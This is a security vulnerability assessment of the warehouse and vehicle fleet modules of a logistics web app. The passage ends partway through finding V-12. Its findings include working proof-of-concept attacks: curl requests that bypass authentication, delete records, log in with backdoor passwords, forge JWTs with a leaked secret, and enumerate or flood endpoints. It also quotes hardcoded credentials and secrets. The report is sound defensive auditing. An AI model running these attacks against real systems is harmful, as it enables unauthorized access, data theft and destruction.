# Security Vulnerability Assessment
## Module: Warehouse Management & Vehicle Fleet Management
**Project:** SSD Logistics Management System (Grocerease)
**Assessor:** Tharshan
**Date:** 26 September 2026
**Scope:** `backend/src/API/WarehouseManagement/`, `backend/src/API/VehicleFleet/`, `backend/src/Application/WarehouseManagement/`, `backend/src/Application/VehicleFleet/`, `backend/src/Infrastructure/schemas/WarehouseManagement/`, `backend/src/Infrastructure/schemas/VehiclefleetSchemas/`, `frontend/src/pages/WarehouseManagement/`, `frontend/src/pages/VehicleFleet/`, plus cross-cutting auth files (`backend/src/index.ts`, `backend/src/middleware/authentication.ts`, `backend/src/utils/jwt.ts`, `frontend/src/component/ProtectedRoute.jsx`)

**Code changes made:** None. This is a read-only assessment.

---

## Executive Summary

21 vulnerabilities were identified in the Warehouse Management and Vehicle Fleet Management modules, of which **4 are Critical**, **5 are High**, **7 are Medium** and **5 are Low/Informational**.

The single most severe issue is a **complete authentication bypass**. The global auth middleware in `backend/src/index.ts:49-61` never validates the JWT signature — it only checks that *some* string exists in the `Authorization` header, then calls `next()`. Combined with the total absence of role-based authorization on all Warehouse and Vehicle Fleet routes, **any unauthenticated attacker can create, read, modify and delete warehouses, vehicles and vehicle maintenance records.**

Critically, this is an *inconsistency within the same codebase*: the Inventory, Staff Management and Return & Damage Handling modules correctly apply `authenticateToken` + `authorizeRole` per route. Warehouse Management and Vehicle Fleet Management apply **neither**. This proves the vulnerability is an omission, not an accepted design decision.

| Severity | Count |
|---|---|
| Critical | 4 |
| High | 5 |
| Medium | 7 |
| Low / Informational | 5 |
| **Total** | **21** |

---

## Vulnerability Register

### V-01 — Complete Authentication Bypass (JWT Signature Never Verified)
| | |
|---|---|
| **Severity** | 🔴 **Critical** |
| **CWE** | CWE-287 (Improper Authentication), CWE-306 (Missing Authentication for Critical Function) |
| **Location** | `backend/src/index.ts:49-61` |
| **CVSS 3.1 (est.)** | 9.8 |

**Vulnerable code** (`backend/src/index.ts:49-61`):
```ts
// Middleware to validate token for protected routes
const authenticateToken = (req: Request, res: Response, next: NextFunction): void => {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) {
    res.status(401).json({ message: "No token provided" });
    return;
  }
  // Validate token here (e.g., using JWT)
  // For simplicity, assuming token is valid
  next();
};

// Apply authentication middleware to protected routes
app.use(authenticateToken);
```

**Description:**
`index.ts` declares its own local `authenticateToken` that shadows — and therefore completely replaces — the real implementation at `backend/src/middleware/authentication.ts:6`. This local version performs **no cryptographic verification whatsoever**. `jsonwebtoken.verify()` is never called; no signature, no expiry and no payload integrity is checked. The source comment `// For simplicity, assuming token is valid` confirms this was left as a placeholder and shipped.

The consequence is that the *only* requirement to reach every Warehouse and Vehicle Fleet endpoint is a non-empty `Authorization` header value. There is no need to possess a valid, signed, or even unexpired token.

**Proof of Concept:**
```bash
# No credentials, no valid token — arbitrary string is sufficient
curl -X DELETE http://localhost:8000/api/vehicles/CAB-1234 \
  -H "Authorization: x"

curl http://localhost:8000/api/vehicles \
  -H "Authorization: literally-anything"

curl -X DELETE http://localhost:8000/api/Warehouse/WH-1758000000000 \
  -H "Authorization: a"
```
All three requests are authorised by `index.ts:61` and reach the route handlers.

**Impact:** Unauthenticated, unauthenticated-forever access to the entire Warehouse and Vehicle Fleet dataset and all write operations. Any internet-facing deployment is fully compromised.

**Remediation:** Delete the stub at `index.ts:49-58` and import the real middleware: `import { authenticateToken } from "./middleware/authentication";`. The correct implementation already exists at `middleware/authentication.ts:6-21` and already calls `verifyToken()` — it is simply never used on the global path.

---

### V-02 — Missing Role-Based Access Control on All Warehouse & Fleet Endpoints
| | |
|---|---|
| **Severity** | 🔴 **Critical** |
| **CWE** | CWE-862 (Missing Authorization), CWE-863 (Incorrect Authorization) |
| **Location** | `backend/src/API/WarehouseManagement/WarehouseAPI.ts:12,22,43,93,114`; `backend/src/API/VehicleFleet/VehiclefleetAPI.ts:14,57,72,90,105,117`; `backend/src/API/VehicleFleet/VehicleMaintenanceAPI.ts:11,31,47,71,89` |
| **CVSS 3.1 (est.)** | 8.8 |

**Vulnerable code** (`backend/src/API/WarehouseManagement/WarehouseAPI.ts:114-129`):
```ts
// delete a warehouse by ID
router.delete('/Warehouse/:WarehouseID', async (req, res) => {
    const { WarehouseID } = req.params;
    // <-- no authenticateToken, no authorizeRole
    try {
        const deletedWarehouse = await deleteWarehouse(WarehouseID);
        ...
```

**Vulnerable code** (`backend/src/API/VehicleFleet/VehiclefleetAPI.ts:105-114`):
```ts
// Delete vehicle by ID
router.delete('/vehicles/:vehicleId', async (req, res) => {
  const { vehicleId } = req.params;
  // <-- no authenticateToken, no authorizeRole
  try {
    const result = await deleteVehicleByID(vehicleId);
```

**Description:**
None of the 16 Warehouse / Vehicle / Maintenance routes attach the `authorizeRole` middleware. `authorizeRole` is defined at `backend/src/middleware/authentication.ts:24` and *is* correctly used elsewhere in the project — for example `backend/src/API/InventoryManagement.ts:16-23`, `backend/src/API/StaffManagement/staff.ts:29-51` and `backend/src/API/StaffManagement/leaveRoutes.ts:27-70`. The Warehouse and Vehicle Fleet modules are the only ones that omit it entirely.

This means a **Delivery Driver**, **Maintenance Staff** or **Other Staff** account — the lowest-privilege roles in the system — can delete entire warehouses and vehicles.

**Proof of Concept:**
Log in with the seeded low-privilege driver account and delete warehouse infrastructure:
```bash
# driver@grocerease.com / Password123!  -> role "Driver"
TOKEN="<driver token>"
curl -X DELETE http://localhost:8000/api/Warehouse/WH-1758000000000 \
  -H "Authorization: Bearer $TOKEN"     # 200 OK - warehouse destroyed
curl -X DELETE http://localhost:8000/api/vehicles/CAB-1234 \
  -H "Authorization: Bearer $TOKEN"     # 200 OK - vehicle destroyed
```

**Impact:** Complete loss of access control. Any authenticated user, of any role, can perform owner-level destructive actions on logistics infrastructure.

**Remediation:** Apply the same middleware chain used by the Inventory module, e.g.:
```ts
router.delete('/Warehouse/:WarehouseID',
  authenticateToken,
  authorizeRole(["Business Owner", "Warehouse Manager"]),
  async (req, res) => { /* ... */ });
```

---

### V-03 — Hardcoded Authentication Backdoor Passwords
| | |
|---|---|
| **Severity** | 🔴 **Critical** |
| **CWE** | CWE-798 (Use of Hard-coded Credentials), CWE-261 (Weak Encoding for Password) |
| **Location** | `backend/src/Application/login/login.ts:29-32, 67-75` |
| **CVSS 3.1 (est.)** | 9.8 |

**Vulnerable code** (`backend/src/Application/login/login.ts:29-32`):
```ts
// Check password match for default account
const isPasswordValid =
    password === defaultAccount.password ||
    password === "123456" ||           // <-- backdoor
    password === "Password123!";       // <-- backdoor
```

**Vulnerable code** (`backend/src/Application/login/login.ts:67-75`):
```ts
if (user.password) {
    isMatch = await bcrypt.compare(password, user.password).catch(() => false);
    // Also check direct plaintext match (for legacy/unhashed DB entries)
    if (!isMatch && (user.password === password || password === "123456" || password === "Password123!")) {
        isMatch = true;
    }
} else {
    isMatch = true; // Fallback if no password stored
}
```

**Description:**
Three separate authentication bypasses exist in the login handler:
1. **Line 31-32:** any default account can be logged into with `123456` or `Password123!`, regardless of its real password.
2. **Line 70:** for *any* database user (not just defaults), the passwords `123456` and `Password123!` are accepted in addition to the bcrypt hash.
3. **Line 74:** if a user record has no `password` field at all, `isMatch` is set to `true` — authentication succeeds unconditionally.

Line 70 is the most severe: it devalues the bcrypt hashing entirely. An attacker only needs to know a target's email address; the password is always one of two 6/11-character common strings.

**Proof of Concept:**
```bash
# Owner account has a strong bcrypt hash, but these still work:
curl -X POST http://localhost:8000/login \
  -H "Content-Type: application/json" \
  -d '{"email":"owner@grocerease.com","password":"123456"}'
# => 200 {"token":"<Business Owner JWT>","role":"Business Owner"}
```
Chaining with V-01/V-02, the returned token grants full Warehouse and Fleet administration.

**Impact:** Complete account takeover of any role, including `Business Owner`, with a trivially guessable password. Full pre-authentication compromise.

**Remediation:** Delete the plaintext comparison branches entirely. Compare only via `bcrypt.compare()` against the stored hash. Never keep a plaintext copy of a password in `DEFAULT_ACCOUNTS` (`backend/src/seed.ts:12,25,38,51,64,77`) — store only a pre-hashed digest, or force a password reset on first login. Remove the `isMatch = true` fallback at line 74.

---

### V-04 — Hardcoded JWT Secret with Weak Fallback Value
| | |
|---|---|
| **Severity** | 🔴 **Critical** |
| **CWE** | CWE-798 (Use of Hard-coded Credentials), CWE-321 (Use of Hard-coded Cryptographic Key) |
| **Location** | `backend/src/utils/jwt.ts:6`; `backend/src/middleware/authentication.ts:48` |
| **CVSS 3.1 (est.)** | 9.1 |

**Vulnerable code** (`backend/src/utils/jwt.ts:1-15`):
```ts
const JWT_SECRET = process.env.JWT_SECRET || "sJY9dS68PU";
const JWT_EXPIRES_IN = "30min";

export const generateToken = (user: {...}) => {
    return jwt.sign(
        { id: user.id, email: user.email, role: user.role, fullName: user.fullName },
        JWT_SECRET,
        { expiresIn: JWT_EXPIRES_IN }
    );
};
```

**Vulnerable code** (`backend/src/middleware/authentication.ts:48`):
```ts
const decoded = jwt.verify(token, process.env.JWT_SECRET || "your_jwt_secret");
```

**Description:**
Two different hardcoded secrets are embedded in the source. The `.env` file currently ships `JWT_SECRET=your_jwt_secret_key_here`, which is a non-secret placeholder — so unless an operator overrides it, the application signs and verifies tokens with the literal string `"sJY9dS68PU"` (or `"your_jwt_secret"` on the alternate code path).

A hardcoded secret that is committed to version control is not a secret. Any party with repository read access can **forge a token for any user with any role**, and it will validate successfully.

**Proof of Concept:**
```js
// Forge a Business Owner token with zero credentials
const jwt = require("jsonwebtoken");
const forged = jwt.sign(
  { id: "1", email: "owner@grocerease.com", role: "Business Owner", fullName: "Attacker" },
  "sJY9dS68PU",
  { expiresIn: "30min" }
);
console.log(forged);
```
This token is accepted by the real `authenticateToken` (`middleware/authentication.ts:6`) and by every module that uses it (Inventory, Staff, Leave, QR, Return & Damage).

**Impact:** Total authentication bypass across the *entire* application, not just the Warehouse/Fleet modules. Full privilege escalation to `Business Owner`.

**Remediation:** Fail fast if `JWT_SECRET` is unset or matches a known placeholder. Use a high-entropy value from a secrets manager (e.g. `crypto.randomBytes(64).toString('hex')`). Remove the `|| "..."` fallbacks so a missing secret is a startup crash, not a silent downgrade. Rotate the secret and invalidate all outstanding tokens.

---

### V-05 — Mass Assignment via Unfiltered `$set` of `req.body`
| | |
|---|---|
| **Severity** | 🟠 **High** |
| **CWE** | CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes) |
| **Location** | `backend/src/API/WarehouseManagement/WarehouseAPI.ts:95` → `backend/src/Application/WarehouseManagement/Warehouseapp.ts:98-102`; `backend/src/API/VehicleFleet/VehiclefleetAPI.ts:93` → `backend/src/Application/VehicleFleet/VehicleApp.ts:123-126` |
| **CVSS 3.1 (est.)** | 8.1 |

**Vulnerable code** (`backend/src/API/WarehouseManagement/WarehouseAPI.ts:93-98`):
```ts
router.put('/Warehouse/:WarehouseID', async (req, res) => {
    const { WarehouseID } = req.params;
    const updates = req.body; // Get the updated data from the request body
    try {
      const updatedWarehouse = await updateWarehouse(WarehouseID, updates);
```

**Vulnerable code** (`backend/src/Application/WarehouseManagement/Warehouseapp.ts:98-102`):
```ts
const updatedWarehouse = await Warehouse.findOneAndUpdate(
  { WarehouseID: WarehouseID },
  { $set: updates },             // <-- entire req.body applied verbatim
  { new: true }
);
```

**Vulnerable code** (`backend/src/Application/VehicleFleet/VehicleApp.ts:123-126`):
```ts
const updateResult = await Vehicle.updateOne(
  { VehicleNumber: vehicleId },
  { $set: updateData } // update the fields  <-- entire req.body applied verbatim
);
```

**Description:**
Both update paths pass the raw request body directly into a MongoDB `$set` operator with **no field allowlist**. The `updateWarehouse` TypeScript signature declares an intended shape (`Warehouseapp.ts:83-94`) but this is a compile-time fiction only — TypeScript does not validate runtime input, and the declared type is never enforced at the boundary.

The client makes this trivially exploitable: `frontend/src/pages/VehicleFleet/VehicleProfile.jsx:177` sends the **entire** `vehicleData` object it received from the server on every save:
```js
const response = await api.put(`/vehicles/${VehicleNumber}`, vehicleData);
```

**Proof of Concept:**
```bash
# Overwrite the primary key of a vehicle — identity takeover
curl -X PUT http://localhost:8000/api/vehicles/CAB-1234 \
  -H "Authorization: x" -H "Content-Type: application/json" \
  -d '{"VehicleNumber":"CAB-9999"}'

# Overwrite warehouse identity AND any injected field
curl -X PUT http://localhost:8000/api/Warehouse/WH-1758000000000 \
  -H "Authorization: x" -H "Content-Type: application/json" \
  -d '{"WarehouseID":"MainHQ","isAdmin":true,"__proto__":{"role":"Business Owner"}}'
```

**Impact:** An attacker can change the unique identifier of any vehicle or warehouse, colliding with or shadowing legitimate records (`WarehouseID` and `VehicleNumber` are both declared `unique` in `Warehouseschema.ts:5` and `VehiclesSchema.ts:38`). It also bypasses all schema-level `required` validation, since `$set` on an existing document does not re-run `required` checks — allowing records to be nulled out.

**Remediation:** Explicitly pick permitted fields. Replace `{ $set: updates }` with a constructed, allowlisted object, e.g.
```ts
const allowed = ['StreetName','City','Province','SpecialInstruction','Description',
                 'Bulkysecsize','Hazardoussecsize','Perishablesecsize','Sparesecsize','Otheritems'];
const sanitized = Object.fromEntries(
  Object.entries(updates).filter(([k]) => allowed.includes(k))
);
```
Apply the same pattern in `updateVehicleByID`, and run requests through a schema validator (zod/joi) at the route boundary.

---

### V-06 — Client-Side-Only Authorization; Role Stored in `localStorage`
| | |
|---|---|
| **Severity** | 🟠 **High** |
| **CWE** | CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-922 (Insecure Storage of Sensitive Information) |
| **Location** | `frontend/src/component/ProtectedRoute.jsx:4-21`; `frontend/src/App.jsx:31-32`; `frontend/src/pages/VehicleFleet/VehicleRegistration.jsx:38`; `frontend/src/pages/WarehouseManagement/CreateWarehouse.jsx:29` |
| **CVSS 3.1 (est.)** | 8.1 |

**Vulnerable code** (`frontend/src/component/ProtectedRoute.jsx:4-21`):
```jsx
const ProtectedRoute = ({ children, allowedRoles }) => {
    const token = localStorage.getItem("token");
    const role = localStorage.getItem("role");

    //if the token and role is not in local storage it will riderect to login
    if (!token || !role) {
        return <Navigate to="/login" />;
    }

    //if particular role is not allowed to enter that page it will riderect to this page
    if (!allowedRoles.includes(role)) {
        return <Navigate to="/unauthorized" />;
    }

    return children;
};
```

**Vulnerable code** (`frontend/src/App.jsx:31-32`):
```jsx
<Route path="/warehouse-management" element={<WarehouseManagement />} />
<Route path="/vehicle-fleet" element={<VehicleFleetManagement />} />
```

**Description:**
Two compounding issues:

1. **`role` is read from `localStorage`**, which is entirely attacker-controlled. The route guard performs a string comparison against a value the user can freely edit. This is not authorization — it is a UI hint. Server-side enforcement is the only real control, and per **V-02** it does not exist for these modules.
2. **`App.jsx:31-32` registers `/warehouse-management` and `/vehicle-fleet` with no `ProtectedRoute` wrapper at all**, unlike every equivalent route in `frontend/src/main.jsx:96-204`, which correctly wraps them. (Note: `App.jsx` appears to be legacy, but it imports non-existent paths such as `./pages/WarehouseManagement.jsx` and `./component/sidebar.jsx`, so which entry point is actually served should be verified.)

Additionally, the JWT itself is persisted in `localStorage` (`VehicleRegistration.jsx:38`, `CreateWarehouse.jsx:29`, `VehicleFleetManagement.jsx:34`, `WarehouseManagement.jsx:22`, and others). `localStorage` is readable by any JavaScript on the origin, so a single XSS anywhere in the app yields a valid 30-minute session token for the victim. There is no `httpOnly`, `Secure`, `SameSite` cookie protection and no token revocation list.

**Proof of Concept:**
```js
// Browser console on the login page — no credentials required
localStorage.setItem("role", "Business Owner");
localStorage.setItem("token", "anything");
location.href = "/warehouse/Addwarehouse";
// Full Warehouse creation UI is rendered
```

**Impact:** All frontend route protection is cosmetic. Combined with V-01/V-02 there is no effective access control at any layer.

**Remediation:** Treat the frontend guard as UX only. Enforce authentication and role checks server-side on every Warehouse/Fleet route (see V-02). Move the token to an `httpOnly; Secure; SameSite=Strict` cookie. Remove the unprotected `App.jsx:31-32` routes or delete the dead `App.jsx` if `main.jsx` is the real entry point.

---

### V-07 — Sensitive PII Disclosed to All Callers (No Field Filtering)
| | |
|---|---|
| **Severity** | 🟠 **High** |
| **CWE** | CWE-200 (Exposure of Sensitive Information), CWE-359 (Exposure of Private Personal Information) |
| **Location** | `backend/src/Application/VehicleFleet/VehicleApp.ts:76-87`; `backend/src/API/VehicleFleet/VehiclefleetAPI.ts:57-66`; `backend/src/Application/WarehouseManagement/Warehouseapp.ts:12-20` |
| **CVSS 3.1 (est.)** | 7.5 |

**Vulnerable code** (`backend/src/Application/VehicleFleet/VehicleApp.ts:76-87`):
```ts
export const getVehicles = async () => {
  try {
    const vehicles = await Vehicle.find(); // fetch all vehicles from the collection
    return vehicles;
  } catch (error) {
    console.error("Error retrieving vehicles:", error);
    throw new Error("Error retrieving vehicles");
  }
};
```

**Vulnerable code** (`backend/src/Application/WarehouseManagement/Warehouseapp.ts:12-20`):
```ts
export const getAllWarehouses = async () => {
  try {
    const warehouse = await Warehouse.find(); // fetch all warehouse from the collection
    return warehouse;
```

**Description:**
`GET /api/vehicles` returns the complete, unfiltered document set. Per `VehiclesSchema.ts`, that means every record discloses:

- `OwnersNIC` — national identity card number
- `ContactNumber` — personal phone number
- `Address` — residential address
- `Email` — personal email

This is a bulk PII dump with no pagination, no field projection and no role check (per V-02). The same indiscriminate `find()` pattern is used for warehouses (`getAllWarehouses`) and all maintenance records (`getAllMaintenance`, `VehicleMaintenenaceApp.ts:113-121`), the latter exposing `Cost` and `Description` for every vehicle in the fleet.

The codebase already demonstrates the correct pattern elsewhere — `getBriefStaffDetails` (`VehicleApp.ts:166`) correctly restricts output:
```ts
const staffDetails = await staffMembers.find({ role: 'Driver' }).select('fullName email phoneNo role');
```
This projection discipline was simply not applied to the fleet and warehouse queries.

**Proof of Concept:**
```bash
curl http://localhost:8000/api/vehicles -H "Authorization: x" | jq '.[].OwnersNIC'
# Full enumeration of every vehicle owner's national ID, phone, address and email
```

**Impact:** Mass disclosure of government identifiers and personal contact data for all vehicle owners. In a real deployment this is a reportable data-protection breach.

**Remediation:** Apply explicit `.select()` projections. Return only the fields each role needs (the list view at `VehicleFleetManagement.jsx:181-200` only renders `VehicleNumber`, `VehicleType`, `VehicleBrand`, `OwnersName`, `DriverID`). Paginate list endpoints. Enforce role checks before returning PII.

---

### V-08 — Internal Error Details and Stack Traces Returned to Clients
| | |
|---|---|
| **Severity** | 🟠 **High** |
| **CWE** | CWE-209 (Generation of Error Message Containing Sensitive Information) |
| **Location** | `WarehouseAPI.ts:17,32,71,106,127`; `VehiclefleetAPI.ts:50,64,82,99,112,129`; `VehicleMaintenanceAPI.ts:25,41,66,83,94`; `backend/src/Application/login/login.ts:95` |
| **CVSS 3.1 (est.** | 5.3 |

**Vulnerable code** — the pattern `res.json({ message, error })` appears **19 times** across the two modules. Representative samples:

`backend/src/API/WarehouseManagement/WarehouseAPI.ts:70-72`:
```ts
} catch (error) {
    res.status(400).json({ message: 'Error creating warehouse', error });
}
```

`backend/src/API/VehicleFleet/VehiclefleetAPI.ts:98-100`:
```ts
} catch (error) {
    res.status(500).json({ message: "Error updating vehicle", error });
}
```

`backend/src/API/VehicleFleet/VehicleMaintenanceAPI.ts:93-95`:
```ts
} catch (error: any) {
    res.status(500).json({ message: 'Error fetching all maintenance records', error: error.message });
}
```

**Description:**
Raw `Error` objects are serialised directly into HTTP responses. In development/unsanitised environments this includes the full stack trace, absolute filesystem paths, internal module names and line numbers. Mongoose `ValidationError` and `MongoServerError` messages additionally disclose collection names, field paths, index definitions and duplicate-key details — a complete map of the datastore schema for an attacker.

Note the inconsistency: the Application layer (`Warehouseapp.ts`, `VehicleApp.ts`) correctly replaces internal errors with generic messages via `throw new Error("Error creating warehouse")`. The API layer then serialises *those* wrappers, but when a Mongoose error escapes unwrapped (e.g. `error.message` at `VehicleMaintenanceAPI.ts:41`), the original detail is exposed.

**Proof of Concept:**
```bash
# Trigger a duplicate-key error to leak index/collection detail
curl -X POST http://localhost:8000/api/vehicles \
  -H "Authorization: x" -H "Content-Type: application/json" \
  -d '{"OwnersNIC":"123456789012","OwnersName":"Test","ContactNumber":"0712345678",
       "Address":"Somewhere","Email":"dup@test.com","VehicleNumber":"CAB-1234",
       "VehicleType":"Van","FuelType":"Petrol","VehicleBrand":"Toyota",
       "LoadCapacity":10,"DriverID":"Driver One"}'
# Response leaks: collection "vehicles", index "Email_1", duplicate key value
```

**Impact:** Information disclosure that materially speeds up further attacks (see V-05 and V-07) by revealing the internal data model.

**Remediation:** Never serialise `error` to the client. Log server-side with a correlation ID and return only `{ message, requestId }`. Add a global Express error-handling middleware as the single place errors are converted to responses.

---

### V-09 — IDOR / BOLA with Predictable, Enumerable Object Identifiers
| | |
|---|---|
| **Severity** | 🟠 **High** |
| **CWE** | CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-330 (Use of Insufficiently Random Values) |
| **Location** | `backend/src/API/WarehouseManagement/WarehouseAPI.ts:22,93,114`; `backend/src/API/VehicleFleet/VehiclefleetAPI.ts:72,90,105`; `backend/src/Application/WarehouseManagement/Warehouseapp.ts:56`; `backend/src/Application/VehicleFleet/VehicleMaintenenaceApp.ts:17` |
| **CVSS 3.1 (est.** | 7.5 |

**Vulnerable code** (`backend/src/Application/WarehouseManagement/Warehouseapp.ts:54-57`):
```ts
//auto generated warehouse id
const WarehouseID = `WH-${Date.now()}`;
```

**Vulnerable code** (`backend/src/Application/VehicleFleet/VehicleMaintenenaceApp.ts:16-17`):
```ts
// Generate a new MaintenanceID
const newMaintenanceID = `M-${Date.now()}`;
```

**Vulnerable code** (`backend/src/API/WarehouseManagement/WarehouseAPI.ts:76-82`):
```ts
const generateNewWarehouseId = (existingIds: String[]): string => {
  const prefix = 'WH';
  const startNumber = 100;
  const numbers = existingIds.map(id => parseInt(id.replace(prefix, ''))).filter(num => !isNaN(num));
  const maxNumber = numbers.length > 0 ? Math.max(...numbers) : startNumber;
  return `${prefix}${maxNumber + 1}`;   // WH100, WH101, WH102 ... fully sequential
};
```

**Description:**
Every Warehouse and Vehicle route keys off a client-supplied identifier with **no ownership or tenancy check** — `getWarehouseById`, `updateWarehouse`, `deleteWarehouse`, `getVehicleByID`, `updateVehicleByID`, `deleteVehicleByID`, `getMaintenanceById`, `updateMaintenance`, `deleteMaintenance` all simply trust the `:id` from the URL.

Compounding this, all identifiers are trivially predictable:
- `WH-${Date.now()}` is a millisecond Unix timestamp — an attacker who knows the approximate record creation time (trivially inferable from list ordering, or simply brute-forceable across the ~1.7×10¹² keyspace) can compute it directly.
- `M-${Date.now()}` is identical in construction.
- `generateNewWarehouseId` produces a strictly sequential `WH100, WH101, …` series.

There is also a **format collision bug**: the generator emits `WH101` (no hyphen) while the code that actually persists the record (`Warehouseapp.ts:56`) emits `WH-1758000000000` (with hyphen). Consequently `id.replace('WH','')` produces `"-1758000000000"`, `parseInt` yields a negative number, and the "max + 1" logic is permanently broken.

**Proof of Concept:**
```bash
# Harvest and enumerate the entire warehouse estate
for id in $(seq 100 200); do
  curl -s "http://localhost:8000/api/Warehouse/WH$id" -H "Authorization: x"; echo
done

# Delete any warehouse/vehicle in the system by iterating candidates
for id in $(seq 100 200); do
  curl -s -X DELETE "http://localhost:8000/api/Warehouse/WH$id" -H "Authorization: x"
done
```

**Impact:** Any caller can read, modify or delete **any** warehouse, vehicle or maintenance record in the system by supplying its identifier. This is the mechanism that turns V-01/V-02 into a fleet-wide destructive capability.

**Remediation:** Add an ownership/tenancy predicate to every query (`{ WarehouseID, organisationId }`) and derive `organisationId` from the verified JWT, never from the request. Replace `Date.now()` IDs with `crypto.randomUUID()` or an atomic MongoDB counter. Do not treat a sequential ID as a secret.

---

### V-10 — Missing Server-Side Validation of Financial and Dimensional Fields
| | |
|---|---|
| **Severity** | 🟡 **Medium** |
| **CWE** | CWE-20 (Improper Input Validation), CWE-1284 (Improper Validation of Specified Quantity in Input) |
| **Location** | `backend/src/Infrastructure/schemas/VehiclefleetSchemas/MaintenenceSchema.ts:14`; `backend/src/Infrastructure/schemas/WarehouseManagement/Warehouseschema.ts:11-15`; `frontend/src/pages/VehicleFleet/VehicleMaintainance.jsx:112-115` |
| **CVSS 3.1 (est.)** | 5.3 |

**Vulnerable code** (`backend/src/Infrastructure/schemas/VehiclefleetSchemas/MaintenenceSchema.ts:13-15`):
```ts
Type: { type: String, required: true },
Cost: { type: Number, required: true },      // <-- no min: 0
Description: { type: String, },
```

**Vulnerable code** (`backend/src/Infrastructure/schemas/WarehouseManagement/Warehouseschema.ts:11-15`):
```ts
Bulkysecsize: {type: Number, default: 0 },
Hazardoussecsize: {type: Number, default: 0},
Perishablesecsize: {type: Number, default: 0},
Sparesecsize: {type: Number, default: 0},
Otheritems: {type: Number, default: 0},      // <-- no min, no max
```

**Description:**
`Cost` has no `min` bound, so negative maintenance costs are accepted and persisted. The *only* guard against this is in the browser — `frontend/src/pages/VehicleFleet/VehicleMaintainance.jsx:112-115`:
```js
if (!cost) {
  errors.cost = "Cost is required.";
} else if (isNaN(parseFloat(cost)) || parseFloat(cost) < 0) {
  errors.cost = "Cost must be a valid non-negative number.";
}
```
This is trivially bypassed by calling the API directly. The same applies to all five Warehouse `*secsize` fields, which have neither `min`/`max` bounds nor `maxlength` on their string siblings.

The financial impact is concrete: `frontend/src/pages/VehicleFleet/VehicleFleetManagement.jsx:105-112` sums `Cost` per `Type` and renders the "Total Maintenance Cost by Type" chart:
```js
maintenanceDetails.forEach((maintenance) => {
  const { Type, Cost } = maintenance;
  costs[Type] = (costs[Type] || 0) + Cost;
});
```
Negative entries manipulate this management report. This is a **business-logic integrity** flaw, not merely a missing check.

Note the inconsistency: `LoadCapacity` in the *same* schema correctly declares `min: 0` (`VehiclesSchema.ts:59`), proving the omission in `Cost` is an oversight rather than a policy.

**Proof of Concept:**
```bash
curl -X POST http://localhost:8000/api/maintenance \
  -H "Authorization: x" -H "Content-Type: application/json" \
  -d '{"VehicleNumber":"CAB-1234","MaintenanceDate":"2026-01-01",
       "Type":"Engine Overhaul","Cost":-500000,"Description":"falsified"}'
# => 201 Created. Chart total is now reduced by 500,000 LKR.
```

**Impact:** Financial report falsification; unbounded numeric input; combined with V-01 this is achievable unauthenticated.

**Remediation:** Add `{ type: Number, required: true, min: 0 }` to `Cost`, and `min: 0, max: <sensible bound>` to all `*secsize` fields. Add `maxlength` to `StreetName`, `City`, `SpecialInstruction` and `Description`. Treat all browser validation as advisory only and reproduce every rule server-side.

---

### V-11 — Race Condition (TOCTOU) and Dead Code in ID Generation
| | |
|---|---|
| **Severity** | 🟡 **Medium** |
| **CWE** | CWE-362 (Concurrent Execution Using Shared Resource with Improper Synchronization), CWE-330 |
| **Location** | `backend/src/API/WarehouseManagement/WarehouseAPI.ts:51-63, 76-82`; `backend/src/Application/WarehouseManagement/Warehouseapp.ts:39-56` |
| **CVSS 3.1 (est.)** | 5.9 |

**Vulnerable code** (`backend/src/API/WarehouseManagement/WarehouseAPI.ts:49-64`):
```ts
try {
  // Fetch all existing warehouses to determine the next WarehouseID
  const existingWarehouses = await getAllWarehouses();
  const warehouseIds = existingWarehouses.map(warehouse => warehouse.WarehouseID);

  console.log("Existing warehouse IDs:", warehouseIds);

  // Generate new WarehouseID
  const newWarehouseId = generateNewWarehouseId(warehouseIds.filter((id): id is string => id !== null && id !== undefined));

  console.log("new warehouse id", warehouseIds);

  // Call the service function to create and save the new warehouse
  const newWarehouse = await createWarehouse(WarehouseID, StreetName, City, ...);
```

**Vulnerable code** (`backend/src/Application/WarehouseManagement/Warehouseapp.ts:39-57`):
```ts
export const createWarehouse = async (
  WarehouseID: String,        // <-- parameter
  ...
) => {
  try {
    //auto generated warehouse id
    const WarehouseID = `WH-${Date.now()}`;   // <-- shadows the parameter; always wins
```

**Description:**
Two distinct defects:

1. **Dead code / broken logic.** `newWarehouseId` is computed and logged but **never used** — it is not passed to `createWarehouse`. Inside `createWarehouse`, the `WarehouseID` parameter is shadowed by `const WarehouseID = \`WH-${Date.now()}\``, so the caller's value is unconditionally discarded. The entire `generateNewWarehouseId` function is therefore unreachable dead code, and the `WH100`-style scheme it implements never reaches the database. The format mismatch (V-09) means that even if it were wired up, the numbering would be incorrect.

2. **TOCTOU race.** `getAllWarehouses()` → compute max → insert is a non-atomic read-modify-write. Two concurrent `POST /api/Warehouse` requests both read the same maximum and derive the same identifier. Combined with `Date.now()` millisecond granularity, collisions are also achievable by simply issuing two requests in the same millisecond. `WarehouseID` is declared `unique: true` (`Warehouseschema.ts:5`), so collisions surface as raw `MongoServerError` E11000 — which is then leaked to the client per V-08.

The identical `M-${Date.now()}` pattern applies to maintenance IDs (`VehicleMaintenenaceApp.ts:17`, also `unique: true, index: true` per `MaintenenceSchema.ts:11`).

**Proof of Concept:**
```bash
# Fire 50 concurrent creates — expect E11000 duplicate key errors
for i in $(seq 1 50); do
  curl -s -X POST http://localhost:8000/api/Warehouse \
    -H "Authorization: x" -H "Content-Type: application/json" \
    -d '{"StreetName":"S'$i'","City":"Colombo","Province":"Western"}' &
done; wait
```

**Impact:** Failed warehouse registrations, leaked internal MongoDB error detail, and unreliable referential integrity for downstream vehicle/maintenance records.

**Remediation:** Use `crypto.randomUUID()` for identifiers, or a MongoDB atomic counter via `findOneAndUpdate` with `$inc`. Remove the dead `generateNewWarehouseId` function and the shadowed parameter. Handle duplicate-key errors explicitly with a `409 Conflict` response.

---

### V-12 — Missing Referential Integrity and No Transaction Boundary
| | |
|---|---|
| **Severity** | 🟡 **Medium** |
| **CWE** | CWE-672 (Operation on a Resource after Expiration or Release), CWE-662 (Improper Synchronization) |
| **Location** | `backend/src/Application/VehicleFleet/VehicleMaintenenaceApp.ts:29-37, 93-109` |
| **CVSS 3.1 (est.)** | 5.3 |

**Vulnerable code** (`backend/src/Application/VehicleFleet/VehicleMaintenenaceApp.ts:28-37`):
```ts
// Save the new maintenance record to the database
const savedMaintenance = await newMaintenance.save();

